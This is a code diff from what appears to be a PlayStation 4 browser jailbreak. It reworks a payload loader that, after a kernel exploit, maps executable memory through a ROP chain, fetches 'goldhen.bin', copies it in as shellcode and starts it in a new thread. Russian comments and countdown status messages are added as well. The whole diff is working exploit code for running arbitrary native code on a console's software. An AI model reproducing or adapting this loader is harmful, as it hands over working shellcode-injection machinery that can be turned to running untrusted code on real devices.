@@ -1799,60 +1799,86 @@ function array_from_address(addr, size) {
 }
 
 function runPayload(PLfile) {
-  var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
-  var tmpStubArray = array_from_address(loader_addr, 1);
-  tmpStubArray[0] = 0x00C3E7FF;
+  return new Promise((resolve, reject) => {
+    try {
+      var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
+      var tmpStubArray = array_from_address(loader_addr, 1);
+      tmpStubArray[0] = 0x00C3E7FF;
 
-  var req = new XMLHttpRequest();
-  req.responseType = "arraybuffer";
-  req.open('GET', PLfile);
-  req.send();
+      var req = new XMLHttpRequest();
+      req.responseType = "arraybuffer";
+      req.open('GET', PLfile);
 
-  req.onreadystatechange = function () {
-    if (req.readyState == 4) {
-      if (req.status === 200 && req.response) {
-        var PLD = req.response;
-        var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength * 4, 7, 0x1002, -1, 0);
-        var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
-        var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-        var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-        tmp.set(new Uint8Array(req.response), 0);
-        tmp.set(padding, req.response.byteLength);
-        var shellcode = new Uint32Array(tmp.buffer);
-        pl.set(shellcode, 0);
-        var pthread = malloc(0x10);
+      req.onload = function () {
+        if (req.status === 200 && req.response) {
+          var PLD = req.response;
+          var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength * 4, 7, 0x1002, -1, 0);
+          var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
+          var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+          var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+          tmp.set(new Uint8Array(req.response), 0);
+          tmp.set(padding, req.response.byteLength);
+          var shellcode = new Uint32Array(tmp.buffer);
+          pl.set(shellcode, 0);
+          var pthread = malloc(0x10);
 
-        call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-      }
+          call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
+          resolve();
+        } else {
+          reject(new Error("Не удалось загрузить бинарник, код: " + req.status));
+        }
+      };
+
+      req.onerror = function () {
+        reject(new Error("Сетевая ошибка при запросе пейлоада"));
+      };
+
+      req.send();
+    } catch (e) {
+      reject(e);
     }
-  };
+  });
 }
 
-kexploit().then(() => {
-    // Даем ядру 1 секунду прийти в себя после патча, затем льем GoldHEN
-    setTimeout(() => {
-        runPayload("./goldhen.bin");
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function startExploit() {
+    try {
+        // 1. Выполняем эксплойт ядра и патчи
+        await kexploit();
+
+        // 2. Наглядный обратный отсчет 5 секунд перед инъекцией
+        for (let i = 5; i > 0; i--) {
+            if (typeof msgs !== 'undefined' && msgs) {
+                msgs.innerHTML = `Ядро пропатчено! Пауза перед GoldHEN: ${i} сек...`;
+                msgs.style.color = "#facc15"; // Желтый цвет
+            }
+            await sleep(1000);
+        }
+
+        if (typeof msgs !== 'undefined' && msgs) {
+            msgs.innerHTML = "Внедрение GoldHEN...";
+            msgs.style.color = "#38bdf8"; // Голубой цвет
+        }
+
+        // 3. Загружаем и запускаем бинарник
+        await runPayload("./goldhen.bin");
+
+        // 4. Финальный статус
         if (typeof msgs !== 'undefined' && msgs) {
             msgs.innerHTML = "GoldHEN v2.4b18.10 Loaded ...";
-			msgs.style.color = "#2cfc03";
+            msgs.style.color = "#2cfc03"; // Зеленый цвет
         }
-    }, 1800);
-}).catch((err) => {
-    if (typeof msgs !== 'undefined' && msgs) {
-        msgs.innerHTML = "Failed to Load! Restart Your Console ...";
-        msgs.style.color = "red";
+    } catch (err) {
+        if (typeof msgs !== 'undefined' && msgs) {
+            msgs.innerHTML = "Failed to Load! Restart Your Console ...";
+            msgs.style.color = "red";
+        }
+        throw new Error("Kexploit failed: " + (err ? err.message : "unknown error"));
     }
-    // Выбрасываем ошибку, чтобы её поймал addEventListener('error') из alert.js
-    throw new Error("Kexploit failed: " + (err ? err.message : "unknown error"));
-});
+}
 
-
-// kexploit().then(() => {
-	// setTimeout(() => {
-		// runPayload("./goldhen_2.4b18.10.bin");
-		// msgs.innerHTML = "GoldHEN v2.4b18.10 Loaded ...";
-	// },500);
-// }).catch(() => {
-    // msgs.innerHTML = "Failed to Load! Restart Your Console ...";
-	// msgs.style.color = "yellow";
-// });
+// Запуск процесса
+startExploit();
